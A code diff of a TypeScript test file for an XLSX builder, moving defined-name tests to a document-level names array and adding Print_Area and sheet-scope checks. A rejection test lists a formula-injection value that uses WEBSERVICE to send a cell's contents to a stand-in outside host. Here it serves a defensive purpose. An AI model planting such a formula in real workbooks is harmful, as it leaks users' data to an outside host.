@@ -1,5 +1,6 @@
 import { describe, expect, it } from "vitest";
 import type {
+  ContentDefinedName,
   ContentDocument,
   ContentEmbeddedObject,
   ContentSheet,
@@ -10,7 +11,13 @@ import type { XmlElement } from "../../model/node";
 import type { Package } from "../../model/package";
 import { encodePackage } from "../../codec";
 import { parsePackage } from "../../package-io/read";
-import { attr, childrenWithTag, decodeEntities, rootElement } from "../util";
+import {
+  attr,
+  childrenWithTag,
+  decodeEntities,
+  rootElement,
+  textContent,
+} from "../util";
 import { buildXlsxPackageFromContent } from "./build";
 import { readXlsxContent } from "./content";
 import { readWorkbookDefinitions } from "./definitions";
@@ -1751,17 +1758,7 @@ function tableDefinitions(): DefinitionsTable {
   };
 }
 
-function namedRangeDefinitions(): DefinitionsTable {
-  return {
-    "namedRange:TaxRate": {
-      kind: "namedRange",
-      name: "TaxRate",
-      refersTo: "Sheet1!$B$1",
-    },
-  };
-}
-
-describe("buildXlsxPackageFromContent: definitions table (general defined names and Table objects)", () => {
+describe("buildXlsxPackageFromContent: the definitions option (Table objects) and the document's own names", () => {
   it("writes a real xl/tables/tableN.xml plus a worksheet tableParts entry for a table definitions entry, and reading it back through readWorkbookDefinitions recovers the same entry", () => {
     const pkg = buildXlsxPackageFromContent(singleSheetDocument([]), {
       definitions: tableDefinitions(),
@@ -1780,10 +1777,13 @@ describe("buildXlsxPackageFromContent: definitions table (general defined names 
     expect(readWorkbookDefinitions(pkg)).toEqual(tableDefinitions());
   });
 
-  it("writes a real general <definedName> for a namedRange definitions entry, and reading it back through readWorkbookDefinitions recovers the same entry", () => {
-    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]), {
-      definitions: namedRangeDefinitions(),
-    });
+  it("writes a real general <definedName> for a names entry, and reading it back through the flat reader recovers the same entry verbatim", () => {
+    const wide = singleSheetDocument([]);
+    if (wide.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    wide.names = [{ name: "TaxRate", refersTo: "Sheet1!$B$1" }];
+    const pkg = buildXlsxPackageFromContent(wide);
     const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
     if (workbook === undefined) {
       throw new Error("expected xl/workbook.xml to have a root element");
@@ -1796,40 +1796,56 @@ describe("buildXlsxPackageFromContent: definitions table (general defined names 
       (element) => attr(element, "name") === "TaxRate",
     );
     expect(definedName).toBeDefined();
+    if (definedName !== undefined) {
+      expect(textContent(definedName)).toBe("Sheet1!$B$1");
+    }
 
-    expect(readWorkbookDefinitions(pkg)).toEqual(namedRangeDefinitions());
+    const reread = readXlsxContent(pkg);
+    if (reread.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    expect(reread.names).toEqual([
+      { name: "TaxRate", refersTo: "Sheet1!$B$1" },
+    ]);
   });
 
-  it("writes sheet-quoted ranges, unions, column ranges, and row ranges as named ranges, and recovers each through readWorkbookDefinitions", () => {
-    const definitions: DefinitionsTable = {
-      "namedRange:Quoted": {
-        kind: "namedRange",
-        name: "Quoted",
-        refersTo: "'Q1 Summary'!$A$1:$C$3",
-      },
-      "namedRange:Union": {
-        kind: "namedRange",
-        name: "Union",
-        refersTo: "Sheet1!$A$1:$A$9,Sheet1!$C$1:$C$9",
-      },
-      "namedRange:Columns": {
-        kind: "namedRange",
-        name: "Columns",
-        refersTo: "Sheet1!$A:$C",
-      },
-      "namedRange:Rows": {
-        kind: "namedRange",
-        name: "Rows",
-        refersTo: "Sheet1!$1:$3",
-      },
-    };
-    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]), {
-      definitions,
-    });
-    expect(readWorkbookDefinitions(pkg)).toEqual(definitions);
+  it("writes scopeSheetIndex back as localSheetId, recovering the same sheet-scoped name", () => {
+    const wide = singleSheetDocument([]);
+    if (wide.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    wide.names = [
+      { name: "ReportTitle", refersTo: "Sheet1!$A$1", scopeSheetIndex: 0 },
+    ];
+    const reread = readXlsxContent(buildXlsxPackageFromContent(wide));
+    if (reread.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    expect(reread.names).toEqual([
+      { name: "ReportTitle", refersTo: "Sheet1!$A$1", scopeSheetIndex: 0 },
+    ]);
   });
 
-  it("refuses a named range whose refersTo carries formula or external-reference content, by name", () => {
+  it("writes sheet-quoted ranges, unions, column ranges, and row ranges as names, and recovers each through the flat reader", () => {
+    const names: ContentDefinedName[] = [
+      { name: "Quoted", refersTo: "'Q1 Summary'!$A$1:$C$3" },
+      { name: "Union", refersTo: "Sheet1!$A$1:$A$9,Sheet1!$C$1:$C$9" },
+      { name: "Columns", refersTo: "Sheet1!$A:$C" },
+      { name: "Rows", refersTo: "Sheet1!$1:$3" },
+    ];
+    const wide = singleSheetDocument([]);
+    if (wide.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    wide.names = names;
+    const reread = readXlsxContent(buildXlsxPackageFromContent(wide));
+    if (reread.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    expect(reread.names).toEqual(names);
+  });
+
+  it("refuses a name whose refersTo carries formula or external-reference content, by name", () => {
     const refused: readonly string[] = [
       'Sheet1!$A$1&WEBSERVICE("http://example.invalid/"&A1)',
       "SUM(Sheet1!$A$1:$A$9)",
@@ -1840,20 +1856,98 @@ describe("buildXlsxPackageFromContent: definitions table (general defined names 
       "#REF!",
     ];
     for (const refersTo of refused) {
-      const definitions: DefinitionsTable = {
-        "namedRange:Danger": {
-          kind: "namedRange",
-          name: "Danger",
-          refersTo,
-        },
-      };
-      expect(() =>
-        buildXlsxPackageFromContent(singleSheetDocument([]), { definitions }),
-      ).toThrow(/sheet-qualified internal A1 reference/);
+      const wide = singleSheetDocument([]);
+      if (wide.kind !== "spreadsheet") {
+        throw new Error("expected a spreadsheet ContentDocument");
+      }
+      wide.names = [{ name: "Danger", refersTo }];
+      expect(() => buildXlsxPackageFromContent(wide)).toThrow(
+        /sheet-qualified internal A1 reference/,
+      );
     }
   });
 
-  it("writes no <definedNames> container and no xl/tables part at all when no definitions are supplied", () => {
+  it("writes a names entry's own print built-in VERBATIM, deriving one from print settings only when the array does not already carry it", () => {
+    const wide = singleSheetDocument([]);
+    if (wide.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    const sheet = wide.sheets[0];
+    if (sheet === undefined) {
+      throw new Error("expected a sheet at index 0");
+    }
+    sheet.printSettings = {
+      ...sheet.printSettings,
+      printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
+    };
+    wide.names = [
+      // The names array's own refersTo is the higher-fidelity spelling -- the derived Print_Area for sheet 0 must not duplicate or replace it.
+      {
+        name: "_xlnm.Print_Area",
+        refersTo: "Sheet1!$A$1:$B$10,Sheet1!$D$1:$E$5",
+        scopeSheetIndex: 0,
+      },
+      { name: "TaxRate", refersTo: "Sheet1!$B$1" },
+    ];
+    const pkg = buildXlsxPackageFromContent(wide);
+    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
+    if (workbook === undefined) {
+      throw new Error("expected xl/workbook.xml to have a root element");
+    }
+    const definedNames = childrenWithTag(workbook, "definedNames")[0];
+    if (definedNames === undefined) {
+      throw new Error("expected a <definedNames> container");
+    }
+    const entries = childrenWithTag(definedNames, "definedName").map(
+      (element) => ({
+        name: attr(element, "name"),
+        localSheetId: attr(element, "localSheetId"),
+        refersTo: textContent(element),
+      }),
+    );
+    expect(entries).toEqual([
+      {
+        name: "_xlnm.Print_Area",
+        localSheetId: "0",
+        refersTo: "Sheet1!$A$1:$B$10,Sheet1!$D$1:$E$5",
+      },
+      { name: "TaxRate", localSheetId: undefined, refersTo: "Sheet1!$B$1" },
+    ]);
+  });
+
+  it("derives the reserved print names from structured print settings when the names array carries none", () => {
+    const wide = singleSheetDocument([]);
+    if (wide.kind !== "spreadsheet") {
+      throw new Error("expected a spreadsheet ContentDocument");
+    }
+    const sheet = wide.sheets[0];
+    if (sheet === undefined) {
+      throw new Error("expected a sheet at index 0");
+    }
+    sheet.printSettings = {
+      ...sheet.printSettings,
+      printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
+    };
+    const pkg = buildXlsxPackageFromContent(wide);
+    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
+    if (workbook === undefined) {
+      throw new Error("expected xl/workbook.xml to have a root element");
+    }
+    const definedNames = childrenWithTag(workbook, "definedNames")[0];
+    if (definedNames === undefined) {
+      throw new Error("expected a <definedNames> container");
+    }
+    const entries = childrenWithTag(definedNames, "definedName");
+    expect(entries).toHaveLength(1);
+    const printArea = entries[0];
+    if (printArea === undefined) {
+      throw new Error("expected a print-area definedName");
+    }
+    expect(attr(printArea, "name")).toBe("_xlnm.Print_Area");
+    expect(attr(printArea, "localSheetId")).toBe("0");
+  });
+
+  it("writes no <definedNames> container and no xl/tables part at all when no definitions are supplied and the document carries no names", () => {
     const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
     const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
     if (workbook === undefined) {
